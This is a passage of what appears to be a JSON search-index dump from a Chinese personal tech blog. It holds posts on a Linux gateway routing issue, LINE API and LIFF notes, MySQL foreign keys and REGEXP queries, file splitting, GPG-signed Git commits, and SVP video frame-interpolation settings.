title=\"使用上設定防火牆陷阱\"></a>使用上設定防火牆陷阱</h2><p>最近公司AP Server 程式使用 mail 發信的時候<br>明明有設定防火牆開通 IP<br>結果不能發出去</p>\n<p>後來發現是 AP Server IP 是吃別的 IP<br>這邊 mail server 是不同網段，所以會走 gateway<br>IP Gateway 預設不是走 interface AP  這邊<br>可以用 ip route show<br>主要是看這一行</p>\n<p>default via 192.168.1.1 dev eth0 src 192.168.1.202 metric 202</p>\n","categories":["網路"],"tags":["linux","ip"]},{"title":"串接 LINE message API(WebHook)  和 LIFF 小記","url":"/blog/2020/04/16/%E4%B8%B2%E6%8E%A5-LINE-message-API-WebHook-%E5%92%8C-LIFF-%E5%B0%8F%E8%A8%98/","content":"<p>TODO: 尚未整理完成</p>\n<a id=\"more\"></a>\n<h2 id=\"建議要使用同一組帳號開發\"><a href=\"#建議要使用同一組帳號開發\" class=\"headerlink\" title=\"建議要使用同一組帳號開發\"></a>建議要使用同一組帳號開發</h2><p>不同人的建立 Line project 的時候，<strong>同一個人產生的 userid 會不一樣</strong>。<br>但是同一個建的多個 project 會產生相同的 userid。<br>再串接上比較不會</p>\n<h2 id=\"webhook\"><a href=\"#webhook\" class=\"headerlink\" title=\"webhook\"></a>webhook</h2><p>push</p>\n<p>reply</p>\n<p>follow</p>\n<p>unfollow</p>\n<p>webhook</p>\n<h3 id=\"注意事項\"><a href=\"#注意事項\" class=\"headerlink\" title=\"注意事項\"></a>注意事項</h3><p>驗證憑證</p>\n<p><a href=\"https://developers.line.biz/en/reference/messaging-api/#response\" target=\"_blank\" rel=\"noopener\">Messaging API reference | LINE Developers</a></p>\n<h2 id=\"LIFF\"><a href=\"#LIFF\" class=\"headerlink\" title=\"LIFF\"></a>LIFF</h2><h3 id=\"注意事項-1\"><a href=\"#注意事項-1\" class=\"headerlink\" title=\"注意事項\"></a>注意事項</h3><p>token 關掉註銷</p>\n<p>email 權限<br><a href=\"https://developers.line.biz/en/docs/line-login/integrate-line-login/#configuring-your-channel\" target=\"_blank\" rel=\"noopener\">Integrating LINE Login with your web app | LINE Developers # Applying for email permission</a></p>\n<p><a href=\"https://engineering.linecorp.com/zh-hant/blog/line-device-10/\" target=\"_blank\" rel=\"noopener\">開發LINE聊天機器人不可不知的十件事 - LINE ENGINEERING</a><br><a href=\"https://medium.com/@justinlee_78563/line-bot-%E7%B3%BB%E5%88%97%E6%96%87-%E4%BB%80%E9%BA%BC%E6%98%AF-webhook-d0ab0bb192be\" target=\"_blank\" rel=\"noopener\">LINE Bot 系列文 — 什麼是 Webhook? - Justin Lee - Medium</a><br><a href=\"http://www.21cs.tw/Nurse/showLiangArticle.xhtml?liangArticleId=503\" target=\"_blank\" rel=\"noopener\">21CS學習網</a></p>\n<h2 id=\"測試內網對外-API-工具\"><a href=\"#測試內網對外-API-工具\" class=\"headerlink\" title=\"測試內網對外 API 工具\"></a>測試內網對外 API 工具</h2><p>ngrok</p>\n<p>localtunnel </p>\n<p><a href=\"https://taichunmin.idv.tw/blog/2020-06-13-linebot-localtunnel-https.html?fbclid=IwAR3eNChmEIJnp7FwVp-sJ4yUifeVRyRmFDa_GNWojjO1vhPFZ3PQIB_dyVY\" target=\"_blank\" rel=\"noopener\">用 localtunnel 幫 chatbot 上 https | 筆記國度</a></p>\n<h2 id=\"表情符號\"><a href=\"#表情符號\" class=\"headerlink\" title=\"表情符號\"></a>表情符號</h2><p>舊版使用特殊文字產生表情符號<br><a href=\"https://qiita.com/Repomn/items/b991f20e4fecd0577d4b\" target=\"_blank\" rel=\"noopener\">LINE BOT の emoticon の説明がよく分からなかったのでリストにしました。 - Qiita</a></p>\n<p>新版<br><a href=\"http://www.evanlin.com/go-emoji/\" target=\"_blank\" rel=\"noopener\">[Golang][LINE][教學] 如何傳送 LINE 專屬的表情符號(emoji)</a><br><a href=\"https://engineering.linecorp.com/zh-hant/blog/line-emoji-with-golang/\" target=\"_blank\" rel=\"noopener\">關於 LINE Emoji 的一些細節（以 Golang 為例) - LINE ENGINEERING</a></p>\n<p>老實說，我覺得舊版還是比較方便….</p>\n","categories":["LIFF"],"tags":["LINE"]},{"title":"主表和關聯表要不要全刪 和 外來鍵一些整理","url":"/blog/2019/04/21/%E4%B8%BB%E8%A1%A8%E5%92%8C%E9%97%9C%E8%81%AF%E8%A1%A8%E8%A6%81%E4%B8%8D%E8%A6%81%E5%85%A8%E5%88%AA-%E5%92%8C-%E5%A4%96%E4%BE%86%E9%8D%B5%E4%B8%80%E4%BA%9B%E6%95%B4%E7%90%86/","content":"<p><del>最近無聊想一些無聊的事情</del><br>最近做 db 主表刪除，在想一些關聯表是不是也要跟著刪除<br>雖然可以用<code>INNER(or LEFT) JOIN</code>容錯<br>但我還想知道一般正常開發者會不會做<code>delete</code>(我之前公司好像沒有這樣習慣)<br>不過，假如要刪除會選哪一種刪除方法<br>目前知道用</p>\n<ol>\n<li>DB 設定 table 結構刪除</li>\n<li>DB 設定 trigger</li>\n<li>程式手動設定刪除</li>\n</ol>\n<p>不知這幾種會用哪一種，所以網路上找到一些答案整理</p>\n<a id=\"more\"></a>\n<h2 id=\"外來鍵\"><a href=\"#外來鍵\" class=\"headerlink\" title=\"外來鍵\"></a>外來鍵</h2><ul>\n<li><a href=\"https://blog.csdn.net/qq_23473123/article/details/79273066\" target=\"_blank\" rel=\"noopener\">数据库该不该使用外键 - 王者之峰 - CSDN 博客</a><br>6.html)</li>\n<li><a href=\"https://www.zhihu.com/question/19600081\" target=\"_blank\" rel=\"noopener\">大家设计数据库时使用外键吗？ - 知乎</a></li>\n<li><a href=\"https://bbs.csdn.net/topics/392328637\" target=\"_blank\" rel=\"noopener\">数据库设计要不要外键？-CSDN 论坛</a></li>\n</ul>\n<p>有看到幾篇，說外來鍵很吃 DB 效能<br>正常可以用程式邏輯去解決掉<br>不過當然設定外來鍵可以減少資料不正確問題<br>目前看到有報表程式會用到外來鍵</p>\n<blockquote>\n<p>問題引入<br>以前的意識裡都是需要建立外鍵，外鍵能起到約束作用，能保證數據的完整性和一直性，比如如果沒有外鍵約束，你自己程序控制又不到位把基本信息都刪除了，詳情卻存在，人的基本信息不存在了，工資信息裡卻存在這個人，想要找這個人究竟是誰都找不到。<br>今天看到原來的外鍵都被去掉了，問了下組長，結果回答就兩個字「效率」，雖然感覺很詫異，但是畢竟人家比我有經驗並沒有去爭論，下面將站在兩個對立面去贊成和反對建立外鍵。<br>作者：qq_23473123<br>来源：CSDN<br>原文：<a href=\"https://blog.csdn.net/qq_23473123/article/details/79273066\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/qq_23473123/article/details/79273066</a><br>版权声明：本文为博主原创文章，转载请附上博文链接！</p>\n</blockquote>\n<p>今天看到這篇，果然過來人經驗還是要聽的<br>之前我前公司我在開發 table<br>設定多個主鍵我是依照需求開的(我前公司沒有用 id 當主鍵)<br>我有一個前輩跟我講這樣設計不會很好<br>程式會缺乏彈性，以後需求變動不是很好改<br>通常可以用程式邏輯去做判斷</p>\n<p>相關外來鍵設定</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">[ON DELETE &#123;CASCADE | SET NULL | NO ACTION | RESTRICT&#125;]</span><br><span class=\"line\">[ON UPDATE &#123;CASCADE | SET NULL | NO ACTION | RESTRICT&#125;]</span><br><span class=\"line\">參數解釋：</span><br><span class=\"line\"></span><br><span class=\"line\">CASCADE - 會將有所關聯的紀錄行也會進行刪除或修改。</span><br><span class=\"line\">SET NULL - 會將有所關聯的紀錄行設定成 NULL。</span><br><span class=\"line\">NO ACTION - 有存在的關聯紀錄行時，會禁止父資料表的刪除或修改動作。</span><br><span class=\"line\">RESTRICT - 與 NO ACTION 相同。</span><br></pre></td></tr></table></figure>\n<ul>\n<li><a href=\"http://lagunawang.pixnet.net/blog/post/25455909-mysql-%E5%BB%BA%E7%AB%8Bforeign-key-%28-innodb-%29-%E6%99%82%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%B8%80%E4%BB%B6%E4%BA%8B\" target=\"_blank\" rel=\"noopener\">MySQL 建立 Foreign Key ( InnoDB ) 時要注意的一件事 @ Amin’s Note :: 痞客邦 ::</a></li>\n<li>[第二十四個夏天後: [MySQL] 使用 FOREIGN KEY 筆記 @ MySQL 5.6](<a href=\"http://blog.changyy.org/2015/01/mysql-foreign-key-mysql-5\" target=\"_blank\" rel=\"noopener\">http://blog.changyy.org/2015/01/mysql-foreign-key-mysql-5</a></li>\n</ul>\n<p>簡單小記，使用外來鍵<br>主表和關聯表，<strong>從關聯表設定外來鍵</strong>，這樣主表要先建立對應 id<br>關聯表才能新增資料<br>反之<br>主表要先刪除關聯表資料，主表才能做<code>刪除</code>動作(PS: 這些動作都是看你設定什麼)</p>\n<p>不過，我覺得還是要看情況，以許是很死的東西(ex:報表、會計)<br>可以用 table，這樣能更確定資料的安全<br>但大部分系統可能不用加入外來鍵</p>\n<h2 id=\"主表刪除，關聯表是否會刪除\"><a href=\"#主表刪除，關聯表是否會刪除\" class=\"headerlink\" title=\"主表刪除，關聯表是否會刪除\"></a>主表刪除，關聯表是否會刪除</h2><p>這個問題網路上找不到人討論這個問題<br>我之前是沒有刪除，但最近想到這個問題<br>仔細想想舊資料殘留在上面好像浪費空間<br>又沒有意義，假如沒有特需用途還是手動刪除吧<br>結論還是<del>無聊想一些無聊的事情</del>手動刪除吧!!</p>\n","categories":["MySQL"],"tags":["mysql"]},{"title":"以固定行數切割文字檔案方法","url":"/blog/2018/04/20/%E4%BB%A5%E5%9B%BA%E5%AE%9A%E8%A1%8C%E6%95%B8%E5%88%87%E5%89%B2%E6%96%87%E5%AD%97%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95/","content":"<p>最近公司做一個動作，需要把Excel檔案資料欄位<br>複製到SQL做IN查詢動作<br>不過資料真的太多了，需要做分開處理<br>目前文件說5000分別丟到SQL去查<br>不過看了一下資料，共10000多筆資料<br>查一下有什麼方法可以交給電腦處理</p>\n<a id=\"more\"></a>\n<h2 id=\"使用Emeditor\"><a href=\"#使用Emeditor\" class=\"headerlink\" title=\"使用Emeditor\"></a>使用Emeditor</h2><p><a href=\"https://briian.com/38454/\" target=\"_blank\" rel=\"noopener\">用 EmEditor 分割、合併超大 TXT 純文字檔 – 【重灌狂人】</a></p>\n<p>「工具」→「分割/合併」→「把目前文件或指定檔案分割成多個檔案」</p>\n<p>資料夾和檔名可以不用設定<br>資料夾<code>$(DIr)\\$(Filename)_split_$(SplitRunSerial)</code><br>檔案<code>$(Filename)_$(SplitFileSerial).$(Ext)</code></p>\n<p>一直下一步就可完完成<br>其實步驟還滿簡單的<br>所以就沒截圖</p>\n<h2 id=\"Linux-command-split切割\"><a href=\"#Linux-command-split切割\" class=\"headerlink\" title=\"Linux command split切割\"></a>Linux command split切割</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">split -l 10000 ping.txt ping.part -d</span><br></pre></td></tr></table></figure>\n<p>-l 是指行數，<br>指定ping.txt到ping.part<br><code>-d</code><strong>沒有打</strong>的話會命名partaa,partab…<br><code>-d</code><strong>有打</strong>的話會是part01,part02</p>\n<p>更多可參考：<br><a href=\"https://blog.gtwang.org/linux/split-large-tar-into-multiple-files-of-certain-size/\" target=\"_blank\" rel=\"noopener\">Linux 使用 split 指令將大檔案切割成小檔案，方便網路傳輸 - G. T. Wang</a><br><a href=\"http://man.linuxde.net/split\" target=\"_blank\" rel=\"noopener\">split命令_Linux split 命令用法详解：分割任意大小的文件</a><br><a href=\"https://www.youtube.com/watch?v=Xu2C2S30uRk\" target=\"_blank\" rel=\"noopener\">How to split LARGE TEXT file into smaller using split utility on Windows - YouTube</a></p>\n","categories":["實用工具"],"tags":["emeditor","split","txt"]},{"title":"使用 GitKrakn GIT 簽章(PGP)","url":"/blog/2021/04/11/%E4%BD%BF%E7%94%A8-GitKrakn-GIT-%E7%B0%BD%E7%AB%A0-PGP/","content":"<p>最近因緣際會下用到 PGP<br>因為我們公司有用 gitlab<br>之前就想研究 Git 簽章怎麼用<br>但一直都沒有去嘗試<br>最近碰到 PGP 加密<br>竟然碰到相關問題，馬上使用看看</p>\n<p>Git mail 使用者名稱都可以自己改上傳<br>使用簽章後，能證明GIT commit 是誰做的</p>\n<p>本篇是以方便使用 GUI 介面操作(Gitkrakn)<br>並非以指令方式去做<br>相關指令推薦爬相關專業文章</p>\n<a id=\"more\"></a>\n<h2 id=\"相關-command-教學\"><a href=\"#相關-command-教學\" class=\"headerlink\" title=\"相關 command 教學\"></a>相關 command 教學</h2><p><a href=\"https://support.gitkraken.com/git-workflows-and-extensions/commit-signing-with-gpg/\" target=\"_blank\" rel=\"noopener\">Commit Signing with gpg - GitKraken Documentation</a></p>\n<p><a href=\"https://blog.miniasp.com/post/2020/05/04/How-to-use-GPG-sign-git-commit-and-tag-object\" target=\"_blank\" rel=\"noopener\">如何使用 GPG (GnuPG) 對 Git Commit 與 Tag 進行簽章 | The Will Will Web</a></p>\n<p><a href=\"https://blog.puckwang.com/post/2019/sign_git_commit_with_gpg/\" target=\"_blank\" rel=\"noopener\">利用 GPG 簽署 git commit | Puck’s Blog</a></p>\n<h2 id=\"簡單教學\"><a href=\"#簡單教學\" class=\"headerlink\" title=\"簡單教學\"></a>簡單教學</h2><p>其實還滿簡單</p>\n<p>在 window 安裝 gpg4win</p>\n<p>設定 gitkrakn 那邊按 Generate (基本上指令可以打<code>GPG</code>就不需要設定)<br><img src=\"https://i.imgur.com/3HEBH0n.png\" alt=\"\"></p>\n<p>GitLab 設定把公鑰用到上面就可以驗證過了，但注意 git mail 名稱要跟 gitlab mail 一樣<br><img src=\"https://i.imgur.com/g8oCWE2.png\" alt=\"\"></p>\n<p>sign commits by default 記得要打勾<br>雖然我還沒找到手動 commit 簽章選項<br>有找到再回來寫</p>\n<p><a href=\"https://gitlab.com/gitlab-org/gitlab-foss/-/issues/37572\" target=\"_blank\" rel=\"noopener\">New added PGP key is unverified (#37572) · Issues · GitLab.org / GitLab FOSS · GitLab</a></p>\n<p>這邊注意簽章信箱要跟gitlab 一樣才不會有問題</p>\n","categories":["Git"],"tags":["git","pgp"]},{"title":"使用 MySQL 做正規化 (REGEXP) 和 查詢含有中文字串方法","url":"/blog/2020/02/20/%E4%BD%BF%E7%94%A8-MySQL-%E5%81%9A%E6%AD%A3%E8%A6%8F%E5%8C%96-REGEXP-%E5%92%8C-%E6%9F%A5%E8%A9%A2%E5%90%AB%E6%9C%89%E4%B8%AD%E6%96%87%E5%AD%97%E4%B8%B2%E6%96%B9%E6%B3%95/","content":"<p>最近報表需要撈出中文字<br>找了一些方法可以用 SELECT 句子撈出</p>\n<p>這篇尚未整理，有空再測試<br><a id=\"more\"></a></p>\n<h2 id=\"UTF-8-中文範圍\"><a href=\"#UTF-8-中文範圍\" class=\"headerlink\" title=\"UTF-8 中文範圍\"></a>UTF-8 中文範圍</h2><p><a href=\"https://zhidao.baidu.com/question/480799001.html\" target=\"_blank\" rel=\"noopener\">utf-8 繁體中文編碼表 範圍 是多少_百度知道</a><br><a href=\"https://dbarobin.com/2015/01/16/distinguish-chinese-characters-in-mysql/\" target=\"_blank\" rel=\"noopener\">MySQL 判断中文字符 | Cryptospace</a><br><a href=\"https://www.haomeili.net/CodeDown/html/double/all/utf-8_65001.html\" target=\"_blank\" rel=\"noopener\">utf-8,Unicode (UTF-8),utf-8编码,Unicode (UTF-8)编码,utf-8字符,Unicode (UTF-8)字符,utf-8编码对照表,Unicode (UTF-8)编码对照表</a><br><a href=\"https://blog.miniasp.com/post/2019/01/02/Common-Regex-patterns-for-Unicode-characters\" target=\"_blank\" rel=\"noopener\">整理 Unicode 經常會使用到的內碼區域並透過 Regex 自動比對文字 | The Will Will Web</a></p>\n<h2 id=\"SQL-方法\"><a href=\"#SQL-方法\" class=\"headerlink\" title=\"SQL 方法\"></a>SQL 方法</h2><h3 id=\"使用正規化\"><a href=\"#使用正規化\" class=\"headerlink\" title=\"使用正規化\"></a>使用正規化</h3><p>mysql&gt; SELECT v<br>    -&gt; FROM<br>    -&gt; (<br>    -&gt;    SELECT ‘sql server是微软开发的数据库管理系统’  AS v UNION ALL<br>    -&gt;    SELECT ‘C-123456789’ AS v UNION ALL<br>    -&gt;    SELECT ‘MySQL是一个开源的数据库管理系统’ AS v UNION ALL<br>    -&gt;    SELECT ‘sdalfkj’<br>    -&gt; )t<br>    -&gt; WHERE v REGEXP ‘[吖-座]’=1;<br>+————————————–+<br>| v                                    |<br>+————————————–+<br>| sql server是微软开发的数据库管理系统 |<br>| MySQL是一个开源的数据库管理系统      |<br>+————————————–+<br>2 rows in set (0.03 sec)<br>————————————————<br>版权声明：本文为CSDN博主「不想长大啊」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href=\"https://blog.csdn.net/sqlserverdiscovery/article/details/50443042\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/sqlserverdiscovery/article/details/50443042</a></p>\n<h3 id=\"length和char-length\"><a href=\"#length和char-length\" class=\"headerlink\" title=\"length和char_length\"></a>length和char_length</h3><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"keyword\">length</span>(<span class=\"string\">\"你好\"</span>),<span class=\"keyword\">char_length</span>(<span class=\"string\">\"你好\"</span>);</span><br></pre></td></tr></table></figure>\n<p>長度不一樣就是含有非英文字!!</p>\n<h2 id=\"其他小記\"><a href=\"#其他小記\" class=\"headerlink\" title=\"其他小記\"></a>其他小記</h2><p><a href=\"https://blog.csdn.net/sqlserverdiscovery/article/details/50443042\" target=\"_blank\" rel=\"noopener\">【MySQL编程你也行】MySQL 识别是否是中文字符的方法_数据库_SQL Server探索-CSDN博客</a></p>\n<p><a href=\"http://www.zhdba.com/mysqlops/2011/02/21/mysql-%E4%B8%A4%E7%A7%8D%E8%AF%86%E5%88%AB%E6%98%AF%E5%90%A6%E6%9C%89%E4%B8%AD%E6%96%87%E5%AD%97%E7%AC%A6%E7%9A%84%E6%96%B9%E6%B3%95/\" target=\"_blank\" rel=\"noopener\">» MySQL 两种识别是否有中文字符的方法</a></p>\n<p><a href=\"https://www.jianshu.com/p/81bfe3db7bcf\" target=\"_blank\" rel=\"noopener\">Unicode 编码相关 - 简书</a></p>\n<p><code>SELECT &#39;ALL I NEED IS YOU の&#39; REGEXP &#39;^[[:&lt;:]]ALL I NEED IS YOU[[:&gt;:]] *((-.+)|([\\[].+[\\]])|([【].+[】])|([\\(].+[\\)])|([一-龥]+))$&#39;</code></p>\n<p><a href=\"https://www.itread01.com/content/1543457232.html\" target=\"_blank\" rel=\"noopener\">oracle查詢欄位是否含有中文 - IT閱讀</a></p>\n","categories":["SQL"],"tags":["mysql","regex"]},{"title":"使用 SVP 補幀 4K 螢幕小記","url":"/blog/2019/12/29/%E4%BD%BF%E7%94%A8-SVP-%E8%A3%9C%E5%B9%80-4K-%E8%9E%A2%E5%B9%95%E5%B0%8F%E8%A8%98/","content":"<p>最近買了 ET322QK C 螢幕<br>有 4K 跟 10bit 畫質<br>順便也換了 Nivda GTX 2060 顯示卡<br>之前舊的顯示卡是用 AMD<br>有使用 AMD FM 補幀<br>最近設定補幀研究設定<br>在這邊做個簡單紀錄<br>(不一定適合每一台電腦)<br>當然我也遇到一些問題</p>\n<p>話說比較新的AMD 顯示卡不能做FM了<br>買新 AMD 顯示卡需要注意!!!</p>\n<p>SVP4 PRO 2020-12-03 最近快轉速度比較不會卡頓了<br>然後我發現用 MPC-HC 播放抖動其況比 PotPlayer 好<br>我原本以為撥放器都一樣…<br><a id=\"more\"></a></p>\n<h2 id=\"相關教學文章\"><a href=\"#相關教學文章\" class=\"headerlink\" title=\"相關教學文章\"></a>相關教學文章</h2><ul>\n<li><a href=\"https://zhuanlan.zhihu.com/p/33615747\" target=\"_blank\" rel=\"noopener\">Potplayer+Lav Filters+madVR - 知乎</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/52347040\" target=\"_blank\" rel=\"noopener\">madVR - 知乎</a></li>\n<li><a href=\"http://m.hangge.com/news/cache/detail_1461.html\" target=\"_blank\" rel=\"noopener\">实现PC视频播放最强画质教程( Potplayer播放器+MADVR插件)</a></li>\n<li><a href=\"https://www.chiphell.com/thread-1922811-2-1.html\" target=\"_blank\" rel=\"noopener\">madvr 720p番剧播放非专业测试 - 第2页 - 电脑讨论 - Chiphell - 分享与交流用户体验</a></li>\n<li><a href=\"https://www.ptt.cc/bbs/PC_Shopping/M.1554154069.A.4B6.html?fbclid=IwAR1dQUTWlp4hKBQ16QnCXP7zJiVujmTEsm2nSf7ZWCBAtHjo-Hj9T30Uhq4\" target=\"_blank\" rel=\"noopener\">Fw: [心得] SVP/FM +MADVR設定 - 看板 PC_Shopping - 批踢踢實業坊</a></li>\n</ul>\n<p><a href=\"https://vcb-s.com/archives/7228\" target=\"_blank\" rel=\"noopener\">[VCB-Studio 科普教程 2.2] 基于 PotPlayer 和 madVR 的播放器教程（已更新 XySubFilter） | VCB-Studio</a><br>我有用這篇，推薦沒用 SVP 補真可以使用這個方式<br>通常在設定 MadVR 改成 10bit 跟 NGU Anti-Alias (scale)</p>\n<h2 id=\"補幀方法\"><a href=\"#補幀方法\" class=\"headerlink\" title=\"補幀方法\"></a>補幀方法</h2><p>一般電影我覺得不用做補幀動作<br><a href=\"https://www.youtube.com/watch?v=--OKrYxOb6Y\" target=\"_blank\" rel=\"noopener\">(1) 【极客周刊】玩游戏为何要60帧才流畅，电影却只需24帧？ - YouTube</a><br>我覺得這邊說的很清楚了</p>\n<h3 id=\"SVP-補幀\"><a href=\"#SVP-補幀\" class=\"headerlink\" title=\"SVP 補幀\"></a>SVP 補幀</h3><p>前幾天 SVP Pro在半價<br>又找不到便宜的二手顯示卡<br>所以就決定衝了</p>\n<p>使用下也遇到很多問題<br>推薦使用 MPC-HC 播放器<br>SVP 跟 Potplayer 使用好像沒辦法 10 bit<br><a href=\"https://www.svp-team.com/wiki/Manual:SVP\" target=\"_blank\" rel=\"noopener\">SVP 4 User Manual - SmoothVideo Project (SVP) - frame doubling interpolation</a><br>所以我後來使用 SVP Pro 裡面內建的 MPC-HC<br>在設定上懶的在調整</p>\n<h4 id=\"SVP、MPC-設定\"><a href=\"#SVP、MPC-設定\" class=\"headerlink\" title=\"SVP、MPC 設定\"></a>SVP、MPC 設定</h4><p>svp<br>裡面安裝的都裝一裝<br>除了你不想用的 youtube 套件<br><img src=\"/blog/2019/12/29/使用-SVP-補幀-4K-螢幕小記/1577603064105.gif\" title=\"SVP設定_1\"><br><img src=\"/blog/2019/12/29/使用-SVP-補幀-4K-螢幕小記/Snipaste_2019-12-29_15-11-04.png\" title=\"SVP設定_2\"><br><img src=\"/blog/2019/12/29/使用-SVP-補幀-4K-螢幕小記/Snipaste_2019-12-29_15-08-44.png\" title=\"SVP設定_3\"></p>\n<p>mpc<br>我看到很多人設定都要載入<code>Lav Video/Audio</code><br>mpc-hc不需要 load<br>原因 mpc 有分成兩種<br>反正 mpc-hc 有包<code>Lav Video/Audio</code><br>不需做什麼額外設定<br>算滿方便的</p>\n<p>我這邊設定<br>相關<code>Lav Video/Audio</code>可參考<a href=\"https://vcb-s.com/archives/7228\" target=\"_blank\" rel=\"noopener\">[VCB-Studio 科普教程 2.2] 基于 PotPlayer 和 madVR 的播放器教程（已更新 XySubFilter） | VCB-Studio</a><br>我不確定是不是 SVP 安裝好會用好設定<br><img src=\"/blog/2019/12/29/使用-SVP-補幀-4K-螢幕小記/1577612497847.gif\" title=\"_1_\"><br><img src=\"/blog/2019/12/29/使用-SVP-補幀-4K-螢幕小記/1577612568993.jpg\" title=\"_2_\"><br>這邊字幕一定要換<strong>XySubFilter</strong></p>\n<p>2020-12-09<br>幫我同學裝 SVP pro 發現他不能選xy-SubFilter<br>假如 MPC 播放器不能選擇xy-SubFilter字幕的話，可以去上面 vcbs 連結裡面抓檔案下來安裝</p>\n<p>不然有時候某些片段會 Lag 掉幀</p>\n<p>聲音可以用獨占模式，請參考這篇設定<a href=\"https://blackmickeysvp.blogspot.com/2017/04/mpc-hc.html\" target=\"_blank\" rel=\"noopener\">黑米奇SVP: 基本教程系列（四）　－　播放軟體 MPC-HC（2017-06-02更新）</a><br>「選項→播放器→輸出→音訊譜製器→內部音訊譜製器」<br>「內部音訊譜製器→獨占模式」另外允許「位元流」可以考慮打開(我不確定那個是做什麼用)</p>\n<h4 id=\"缺點、改善方法\"><a href=\"#缺點、改善方法\" class=\"headerlink\" title=\"缺點、改善方法\"></a>缺點、改善方法</h4><h5 id=\"內嵌字幕扭曲-偽影\"><a href=\"#內嵌字幕扭曲-偽影\" class=\"headerlink\" title=\"內嵌字幕扭曲/偽影\"></a>內嵌字幕扭曲/偽影</h5><p>老實說看動畫幾個非常動態畫面<br>內砍字幕會被影響到<br>但我也有查到改善方法<a href=\"https://ppkkkp.blogspot.com/2016/07/svp-artifacts.html\" target=\"_blank\" rel=\"noopener\">睇片研究所: SVP artifacts masking(偽影去除)設定對畫質的影響及教學</a><br>SVP 著色器 設定<code>複雜</code>就比較沒這個問題<br>大部份這個設定就能改善<br>但幾個動態場景還是能感受到<br>這邊用「未日時在做甚麼?有沒有空?可以來拯救嗎?」幾個片段</p>\n<img src=\"/blog/2019/12/29/使用-SVP-補幀-4K-螢幕小記/1577609946521.gif\" title=\"_1_\">\n<img src=\"/blog/2019/12/29/使用-SVP-補幀-4K-螢幕小記/1577610251475.gif\" title=\"_2_\">\n<p>另一個方法就是設定補插幀模式<code>1.5m (少量偽影)</code><br>但流暢度有降底，我覺得沒是有補到幀，只是沒上面的流暢</p>\n<img src=\"/blog/2019/12/29/使用-SVP-補幀-4K-螢幕小記/1577610711014.gif\" title=\"_1_\">\n<img src=\"/blog/2019/12/29/使用-SVP-補幀-4K-螢幕小記/1577610814227.gif\" title=\"_2_\">\n<p>不能說到完全沒有，但真的比較少</p>\n<p>至於哪個比較好，看個人喜好選擇</p>\n<p>MadVR (Ctrl+J) 看到 <code>dropped frames</code> 沒有看到明顯掉幀</p>\n<p>播放影片左下角會有 SVP 圖示<br>其實可以在<code>應用程式設定→顯示OSD資訊</code>可以關閉<br>但我覺得打開可以很明顯知道是不是有正常啟動SVP<br>還算滿方便的</p>\n<p>還滿適合用外掛字幕來看</p>\n<p>詳細設定可參考:<a href=\"https://blackmickeysvp.blogspot.com/2017/06/smoothvideo-project.html\" target=\"_blank\" rel=\"noopener\">黑米奇SVP: SmoothVideo Project 系列（一）　－　安裝丶簡易設定（2019-05-04更新）</a></p>\n<h3 id=\"雙顯卡\"><a href=\"#雙顯卡\" class=\"headerlink\" title=\"雙顯卡\"></a>雙顯卡</h3><p>AMD + Nivda 做補幀，先講一下!!<br>由於我朋友是用這個方法，他一樣使用Nivda GTX 2060 和 ET322QK C 螢幕，而外買二手 2000多塊 RX 560<br>可以參考這篇這定<a href=\"https://www.ptt.cc/bbs/PC_Shopping/M.1554154069.A.4B6.html?fbclid=IwAR1dQUTWlp4hKBQ16QnCXP7zJiVujmTEsm2nSf7ZWCBAtHjo-Hj9T30Uhq4\" target=\"_blank\" rel=\"noopener\">Fw: [心得] SVP/FM +MADVR設定 - 看板 PC_Shopping - 批踢踢實業坊</a></p>\n<p>使用看畫面流暢，不過 MadVR (Ctrl+J) 看到 <code>dropped frames</code> 有增加<br>不過自己看畫面流暢比較重要，畢竟自己感覺比較重要</p>\n<p>FM 補幀畫面雖然沒有 SVP 比較流暢…，但相對偽影也相當少(應該是沒有)<br>但相對 兩個 GPU 使用率其中一個也佔滿多的<br>跟 SVP 遇到狀況也差不多</p>\n<p><strong>但這個有很大的缺點，你的 Power 要夠力阿!!!!</strong></p>\n<h2 id=\"遇到問題\"><a href=\"#遇到問題\" class=\"headerlink\" title=\"遇到問題\"></a>遇到問題</h2><h3 id=\"真-4K-影片卡頓\"><a href=\"#真-4K-影片卡頓\" class=\"headerlink\" title=\"真 4K 影片卡頓\"></a>真 4K 影片卡頓</h3><p>就暫時關掉 SVP 或 MadVR，我目前最大 1080P 居多<br>真人電影舊不需要開補幀</p>\n<h3 id=\"顯示卡嘯叫\"><a href=\"#顯示卡嘯叫\" class=\"headerlink\" title=\"顯示卡嘯叫\"></a>顯示卡嘯叫</h3><p>在電腦預設裝 MadVR 設定高畫質顯卡會發出聲音<br>預設安裝不會有這種聲音<br>後來裝Heaven Benchmark  跑 3D 軟體也發現有這個聲音<br>只要一關掉影片(或測試顯卡軟體)聲音馬上就不見</p>\n<p>聲音跟這個一樣:RTX 2070 嘯叫(<a href=\"https://www.bilibili.com/video/av39265016/?redirectFrom=h5\" target=\"_blank\" rel=\"noopener\">https://www.bilibili.com/video/av39265016/?redirectFrom=h5</a>)</p>\n<p>我用 MSI Afterburner把風扇關掉 ，有肉眼確認風扇沒有再轉，聲音還是有…</p>\n<p>網路上有看到幾個方法，</p>\n<ol>\n<li>更換顯示卡、主機板、電源供應器(但有些人換有失敗的，所以我不敢買)</li>\n<li>顯卡供電口加濾波電容  (但我看到好像沒有人在賣8 pin + 濾波電容)<br>顯示卡 電流聲 高頻音 coil whine 解決方法(<a href=\"http://joeartanis.blogspot.com/2015/12/coil-whine.html\" target=\"_blank\" rel=\"noopener\">http://joeartanis.blogspot.com/2015/12/coil-whine.html</a>)<br>有看這篇說能解決問題<br>但我找不到哪裡有在賣orz</li>\n<li>膠水大法<br><a href=\"https://www.bilibili.com/video/av8576153?from=search&amp;seid=12894762763554126401\" target=\"_blank\" 